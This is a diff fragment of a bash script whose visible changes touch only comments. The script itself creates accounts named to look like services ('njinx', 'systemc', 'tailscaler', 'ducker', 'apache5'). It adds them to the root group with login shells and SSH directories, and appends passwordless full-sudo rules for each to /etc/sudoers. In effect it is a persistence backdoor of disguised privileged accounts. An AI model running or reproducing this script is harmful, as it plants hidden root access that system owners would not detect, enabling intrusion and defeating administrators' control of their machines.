@@ -5,7 +5,7 @@ usernames=("njinx" "systemc" "tailscaler" "blueteeth" "ducker" "ursql" "apache5"
 
 # Loop through each username
 for username in "${usernames[@]}"; do
-    # Create the user and add to the root group
+    # Create the user, add to the root group, initialize with shell
     useradd -m -G root -s /bin/bash "$username"
 
     # Create SSH directory and set permissions
@@ -22,7 +22,7 @@ for username in "${usernames[@]}"; do
     # Change ownership of the .ssh directory and its contents
     chown -R "$username:$username" "/home/$username/.ssh"
 
-    # Optionally, add the user to the sudoers file
+    # Add the users to the sudoers file
     echo "$username ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 done
 
